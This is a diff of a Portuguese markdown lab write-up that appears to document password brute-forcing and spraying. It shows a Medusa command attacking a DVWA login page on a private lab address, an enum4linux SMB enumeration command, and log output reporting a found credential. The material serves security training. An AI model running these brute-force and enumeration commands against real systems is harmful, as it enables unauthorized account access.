@@ -80,23 +80,6 @@ Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.n
 https://192.168.56.10/dvwa/login.php
 
 
-<img width="1343" height="919" alt="Captura de tela de 2026-11-06 15-31-59" src="https://github.com/user-attachments/assets/a21416c3-b35b-4e05-b49d-b3d522cef97a" />
-
-<img width="1721" height="874" alt="Captura de tela de 2026-11-06 14-37-32" src="https://github.com/user-attachments/assets/1d54dda2-5135-40f0-b507-e4cc1819725d" />
-
-<img width="1163" height="878" alt="Captura de tela de 2026-11-06 15-47-54" src="https://github.com/user-attachments/assets/b5b6cb70-6dc1-4e41-9bb2-f0292bdbc8d7" />
-
-## Password spraying em SMB com enumeração de usuários
-
-
-```
-enum4linux -a 192.168.56.102 | tee enum_output.txt
-```
-
-<img width="1345" height="945" alt="Captura de tela de 2026-11-06 16-46-21" src="https://github.com/user-attachments/assets/8347f748-8b88-497b-a22a-e3aa22b9f2e9" />
-
-
-
 ```
 medusa -h  192.168.56.102 -U users.txt -P pass.txt -M http \
 -m PAGE: '/dvwa/login.php' \
@@ -150,6 +133,27 @@ WARNING: Invalid method: FAIL=Login failed.
 2026-11-10 11:58:32 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 11 complete) Password: password (4 of 4 complete)
 2026-11-10 11:58:32 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user  Password: password [SUCCESS]
 ```
+
+
+<img width="1343" height="919" alt="Captura de tela de 2026-11-06 15-31-59" src="https://github.com/user-attachments/assets/a21416c3-b35b-4e05-b49d-b3d522cef97a" />
+
+<img width="1721" height="874" alt="Captura de tela de 2026-11-06 14-37-32" src="https://github.com/user-attachments/assets/1d54dda2-5135-40f0-b507-e4cc1819725d" />
+
+<img width="1163" height="878" alt="Captura de tela de 2026-11-06 15-47-54" src="https://github.com/user-attachments/assets/b5b6cb70-6dc1-4e41-9bb2-f0292bdbc8d7" />
+
+
+
+
+## Password spraying em SMB com enumeração de usuários
+
+
+```
+enum4linux -a 192.168.56.102 | tee enum_output.txt
+```
+
+<img width="1345" height="945" alt="Captura de tela de 2026-11-06 16-46-21" src="https://github.com/user-attachments/assets/8347f748-8b88-497b-a22a-e3aa22b9f2e9" />
+
+
 
 ## Password spraying em SMB com enumeração de usuários.
 
